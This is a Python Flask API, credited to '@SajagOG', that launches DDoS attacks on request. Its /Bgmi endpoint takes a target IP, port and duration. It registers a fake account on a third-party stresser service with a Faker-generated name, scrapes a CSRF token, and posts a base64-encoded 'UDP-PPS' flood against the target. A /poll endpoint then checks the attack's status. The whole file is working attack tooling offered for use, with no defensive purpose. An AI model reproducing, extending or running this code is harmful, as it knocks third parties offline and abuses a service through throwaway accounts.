from flask import Flask, request, jsonify
import requests
import base64
import json
import re
from faker import Faker

app = Flask(__name__)
fake = Faker()

# Stores active session objects keyed by IP
active_sessions = {}

def get_csrf(session):
    """Helper to extract the CSRF token from the dashboard HTML"""
    try:
        dash_res = session.get('https://netbusterstress.pro/panel')
        # Target the specific line format: 'X-CSRF-Token' : 'value'
        token_match = re.search(r"['\"]X-CSRF-Token['\"]\s*:\s*['\"]([^'\"]+)['\"]", dash_res.text)
        if token_match:
            return token_match.group(1)
    except Exception:
        pass
    return None

@app.route('/')
def home():
    return jsonify({
        "message": "BGMI API is Online",
        "owner": "Api By @SajagOG",
        "usage": "/Bgmi?ip=target&port=port&time=seconds"
    })




@app.route('/Bgmi', methods=['GET'])
def bgmi_launch():
    # Parameters from the GET request
    target_ip = request.args.get('ip')
    target_port = request.args.get('port')
    duration = request.args.get('time')

    if not all([target_ip, target_port, duration]):
        return jsonify({
            "error": "Missing params: ip, port, time",
            "owner": "Api By @SajagOG"
        }), 400

    session = requests.Session()
    session.headers.update({
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    })

    try:
        # 1. Registration Flow
        user = fake.user_name()
        pw = "Pass123!@#"
        session.post('https://netbusterstress.pro/api/register', 
                     json={"username": user, "password": pw},
                     headers={'referer': 'https://netbusterstress.pro/register'})

        # 2. CSRF Extraction
        csrf_token = get_csrf(session)
        if not csrf_token:
            return jsonify({
                "error": "Failed to extract CSRF token",
                "owner": "Api By @SajagOG"
            }), 500

        # 3. Payload Preparation & Encoding
        attack_params = {
            "target": target_ip,
            "port": int(target_port),
            "duration": int(duration),
            "method": "UDP-PPS",
            "concurrent": 1
        }
        encoded_attack = base64.b64encode(json.dumps(attack_params).encode()).decode()
        
        # 4. Final Launch Request
        launch_res = session.post(
            'https://netbusterstress.pro/api/launch',
            json={"encodedAttack": encoded_attack, "csrfToken": csrf_token},
            headers={
                'x-csrf-token': csrf_token, 
                'referer': 'https://netbusterstress.pro/panel',
                'content-type': 'application/json'
            }
        )

        # Cache the session to allow the /poll endpoint to work
        active_sessions[target_ip] = session

        return jsonify({
            "status": "BGMI_LAUNCHED",
            "target": f"{target_ip}:{target_port}",
            "username": user,
            "api_response": launch_res.json() if launch_res.status_code == 200 else launch_res.text,
            "owner": "Api By @SajagOG"
        })

    except Exception as e:
        return jsonify({
            "error": str(e),
            "owner": "Api By @SajagOG"
        }), 500

@app.route('/poll', methods=['GET'])
def poll_status():
    target_ip = request.args.get('ip')
    
    if target_ip not in active_sessions:
        return jsonify({
            "error": "No session found. Launch Bgmi first.",
            "owner": "Api By @SajagOG"
        }), 404

    session = active_sessions[target_ip]
    try:
        response = session.get('https://netbusterstress.pro/api/active', 
                                headers={'referer': 'https://netbusterstress.pro/panel'})
        
        try:
            status_data = response.json()
        except:
            status_data = response.text

        return jsonify({
            "ip": target_ip,
            "live_status": status_data,
            "owner": "Api By @SajagOG"
        })
    except Exception as e:
        return jsonify({
            "error": str(e),
            "owner": "Api By @SajagOG"
        }), 500

if __name__ == '__main__':
    app.run(debug=True, port=5000)
